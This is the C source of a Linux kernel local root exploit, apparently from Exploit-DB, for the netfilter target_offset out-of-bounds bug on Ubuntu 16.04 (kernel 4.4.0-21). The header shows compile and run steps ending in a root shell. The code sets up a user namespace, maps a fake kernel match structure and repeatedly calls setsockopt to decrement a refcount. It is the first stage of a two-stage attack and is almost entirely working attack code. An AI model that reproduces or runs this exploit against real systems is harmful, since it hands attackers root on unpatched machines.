/*
EDB Note: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/40053.zip
*/

/**
 * Ubuntu 16.04 local root exploit - netfilter target_offset OOB
 * check_compat_entry_size_and_hooks/check_entry
 *
 * Tested on 4.4.0-21-generic. SMEP/SMAP bypass available in descr_v2.c
 *
 * Vitaly Nikolenko
 * vnik@cyseclabs.com
 * 23/04/2016
 *
 *
 * ip_tables.ko needs to be loaded (e.g., iptables -L as root triggers
 * automatic loading).
 *
 * vnik@ubuntu:~$ uname -a
 * Linux ubuntu 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
 * vnik@ubuntu:~$ gcc decr.c -m32 -O2 -o decr
 * vnik@ubuntu:~$ gcc pwn.c -O2 -o pwn
 * vnik@ubuntu:~$ ./decr 
 * netfilter target_offset Ubuntu 16.04 4.4.0-21-generic exploit by vnik
 * [!] Decrementing the refcount. This may take a while...
 * [!] Wait for the "Done" message (even if you'll get the prompt back).
 * vnik@ubuntu:~$ [+] Done! Now run ./pwn
 * 
 * vnik@ubuntu:~$ ./pwn
 * [+] Escalating privs...
 * root@ubuntu:~# id
 * uid=0(root) gid=0(root) groups=0(root)
 * root@ubuntu:~# 
 * 
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>
#include <linux/sched.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ptrace.h>
#include <netinet/in.h>
#include <net/if.h>
#include <linux/netfilter_ipv4/ip_tables.h>
#include <linux/netlink.h>
#include <fcntl.h>
#include <sys/mman.h>

#define MALLOC_SIZE 66*1024

int check_smaep() {
	FILE *proc_cpuinfo;
	char fbuf[512];

	proc_cpuinfo = fopen("/proc/cpuinfo", "r");

	if (proc_cpuinfo < 0) {
		perror("fopen");
		return -1;
	}

	memset(fbuf, 0, sizeof(fbuf));
	
	while(fgets(fbuf, 512, proc_cpuinfo) != NULL) {
		if (strlen(fbuf) == 0)
			continue;
		
		if (strstr(fbuf, "smap") || strstr(fbuf, "smep")) {
			fclose(proc_cpuinfo);
			return -1;
		}
	}

	fclose(proc_cpuinfo);
	return 0;
}

int check_mod() {
	FILE *proc_modules;
	char fbuf[256];

	proc_modules = fopen("/proc/modules", "r");

	if (proc_modules < 0) {
		perror("fopen");
		return -1;
	}

	memset(fbuf, 0, sizeof(fbuf));
	
	while(fgets(fbuf, 256, proc_modules) != NULL) {
		if (strlen(fbuf) == 0)
			continue;
		
		if (!strncmp("ip_tables", fbuf, 9)) {
			fclose(proc_modules);
			return 0;
		}
	}

	fclose(proc_modules);
	return -1;
}

int decr(void *p) {
	int sock, optlen;
	int ret;
	void *data;
	struct ipt_replace *repl;
	struct ipt_entry *entry;
	struct xt_entry_match *ematch;
	struct xt_standard_target *target;
	unsigned i;

	sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);

	if (sock == -1) {
	        perror("socket");
	        return -1;
	}

	data = malloc(MALLOC_SIZE);

	if (data == NULL) {
		perror("malloc");
		return -1;
	}

	memset(data, 0, MALLOC_SIZE);

	repl = (struct ipt_replace *) data;
	repl->num_entries = 1;
	repl->num_counters = 1;
	repl->size = sizeof(*repl) + sizeof(*target) + 0xffff;
	repl->valid_hooks = 0;

	entry = (struct ipt_entry *) (data + sizeof(struct ipt_replace));
	entry->target_offset = 74; // overwrite target_offset
	entry->next_offset = sizeof(*entry) + sizeof(*ematch) + sizeof(*target);

	ematch = (struct xt_entry_match *) (data + sizeof(struct ipt_replace) + sizeof(*entry));

	strcpy(ematch->u.user.name, "icmp");
	void *kmatch = (void*)mmap((void *)0x10000, 0x1000, 7, 0x32, 0, 0);
	uint64_t *me = (uint64_t *)(kmatch + 0x58);
	*me = 0xffffffff821de10d; // magic number!

	uint32_t *match = (uint32_t *)((char *)&ematch->u.kernel.match + 4);
	*match = (uint32_t)kmatch;
	
	ematch->u.match_size = (short)0xffff;

	target = (struct xt_standard_target *)(data + sizeof(struct ipt_replace) + 0xffff + 0x8);
	uint32_t *t = (uint32_t *)target;
	*t = (uint32_t)kmatch;

	printf("[!] Decrementing the refcount. This may take a while...\n");
	printf("[!] Wait for the \"Done\" message (even if you'll get the prompt back).\n");

	for (i = 0; i < 0xffffff/2+1; i++) {
		ret = setsockopt(sock, SOL_IP, IPT_SO_SET_REPLACE, (void *) data, 66*1024);
	}

	close(sock);
	free(data);
	printf("[+] Done! Now run ./pwn\n");

	return 0;
}

int main(void) {
	void *stack;
	int ret;

	printf("netfilter target_offset Ubuntu 16.04 4.4.0-21-generic exploit by vnik\n");
	if (check_mod()) {
		printf("[-] No ip_tables module found! Quitting...\n");
		return -1;
	}

	if (check_smaep()) {
		printf("[-] SMEP/SMAP support dectected! Quitting...\n");
		return -1;
	}

	ret = unshare(CLONE_NEWUSER);

	if (ret == -1) {
		perror("unshare");
		return -1;
	}

	stack = (void *) malloc(65536);

	if (stack == NULL) {
		perror("malloc");
		return -1;
	}

	clone(decr, stack + 65536, CLONE_NEWNET, NULL);

	sleep(1);

	return 0;
}